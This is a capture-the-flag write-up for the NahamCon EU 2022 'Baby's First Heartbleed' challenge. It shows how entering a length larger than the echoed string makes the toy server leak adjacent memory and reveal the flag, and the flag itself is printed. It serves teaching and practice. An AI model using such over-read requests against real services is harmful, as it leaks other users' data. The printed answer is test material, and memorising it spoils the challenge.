---
title: "Babys-First-Heartbleed - NahamCon-EU-CTF 2022"
category: "misc"
subcategory: "misc"
type: "writeup"
tags: ["misc", "babys-first-heartbleed", "miscellaneous", "nahamcon-eu-ctf", "siunam321", "babys"]
difficulty: "easy"
summary: "misc writeup for \"Babys-First-Heartbleed\" from NahamCon-EU-CTF - techniques: babys-first-heartbleed, miscellaneous, nahamcon-eu-ctf, siunam321, babys."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/NahamCon-EU-CTF-2022/Warmups/Babys-First-Heartbleed/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/NahamCon-EU-CTF-2022/Warmups/Babys-First-Heartbleed/README.md"
ctf:
  name: "NahamCon-EU-CTF"
  year: 2022
  challenge: "Babys-First-Heartbleed"
---

## Source

- **CTF:** NahamCon-EU-CTF 2022
- **Challenge:** Babys-First-Heartbleed
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/NahamCon-EU-CTF-2022/Warmups/Babys-First-Heartbleed/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/NahamCon-EU-CTF-2022/Warmups/Babys-First-Heartbleed/README.md>

---
# Baby's First Heartbleed

## Overview

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

- Challenge difficulty: Easy

## Background

Author: @JohnHammond#6971  
  
Hey kids!! Wanna learn how to hack??!?! Start here to foster your curiosity!  
  
**Press the `Start` button on the top-right to begin this challenge.**

**Connect with:**  
`nc challenge.nahamcon.com 31305`

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/NahamCon-EU-CTF-2022/images/Pasted%20image%2020221216223317.png)

## Find The Flag

**Let's use `nc`(Netcat) to connect to the docker instance!**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Warmups/Baby's-First-Heartbleed]
└─# nc challenge.nahamcon.com 31305


===============================================================================
     _   _ _____    _    ____ _____ ____  _     _____ _____ ____  
    | | | | ____|  / \  |  _ \_   _| __ )| |   | ____| ____|  _ \ 
    | |_| |  _|   / _ \ | |_) || | |  _ \| |   |  _| |  _| | | | |
    |  _  | |___ / ___ \|  _ < | | | |_) | |___| |___| |___| |_| |
    |_| |_|_____/_/   \_\_| \_\|_| |____/|_____|_____|_____|____/ 
                                                                      
===============================================================================

THANK YOU FOR CONNECTING TO THE SERVER. . .

TO VERIFY IF THE SERVER IS STILL THERE, PLEASE SUPPLY A STRING.

STRING ['apple']: 
```

**Hmm... Let's type `apple`:**
```
STRING ['apple']: apple
LENGTH ['5']: 
```

**The length of `'5'` is 1, we can use `python3` to verify that:**
```
┌──(root🌸siunam)-[~/ctf/NahamCon-EU-CTF-2022/Warmups/Baby's-First-Heartbleed]
└─# python3
[...]
>>> len('5')
1
```

```
LENGTH ['5']: 1

... THE SERVER RETURNED:

a

TO VERIFY IF THE SERVER IS STILL THERE, PLEASE SUPPLY A STRING.

STRING ['apple']: 
```

Wait what??

Umm... What if I typed the length more than 5?

**Let's try again:**
```
STRING ['apple']: apple
LENGTH ['5']: 10

... THE SERVER RETURNED:

apple@appl
```

Hmm... Looks like the `STRING ['apple']` is useless, and **we can leak something interesting in `LENGTH ['x']`!**

**How about we type `1337` in the length?**
```
STRING ['apple']: 
LENGTH ['5']: 1337

... THE SERVER RETURNED:

apple@apple@00@00@00@00@00@00@00@00@00@00@00@00@00@00@apple@00@00@apple@00@apple@00@apple@00@apple@00@flag{bfca3d71260e581ba366dca054f5c8e5}@apple@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00@00
```

Oh!! We leaked the flag!

- **Flag: `flag{bfca3d71260e581ba366dca054f5c8e5}`**

# Conclusion

What we've learned:

1. Leaking The Flag via No Input Validation
